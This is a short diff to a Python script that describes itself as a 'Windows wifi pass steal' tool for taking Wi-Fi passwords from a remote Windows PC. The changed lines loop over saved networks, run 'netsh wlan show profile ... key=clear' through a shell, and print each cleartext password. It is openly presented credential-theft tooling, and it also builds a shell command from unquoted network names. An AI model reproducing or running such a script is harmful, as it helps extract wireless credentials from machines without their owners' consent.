@@ -1,6 +1,6 @@
 #!/usr/bin/python3
 """
-Windows wifi pass steal
+win_wifi_steal.py - Windows wifi pass steal
 
 With this script you can obtain the wifi pass from the remote Windows PC.
 """
@@ -18,7 +18,7 @@ output = ""
 
 # Run the command for all the networks found
 for network in networks_list:
-	command = f"netsh wlan show profile {network} key=clear"
-	result = subprocess.check_output(command, shell=True)
-	output += result
-	print(f"{network} - {result}")
+    command = f"netsh wlan show profile {network} key=clear"
+    result = subprocess.check_output(command, shell=True)
+    output += result
+    print(f"Password for {network} - {result}")
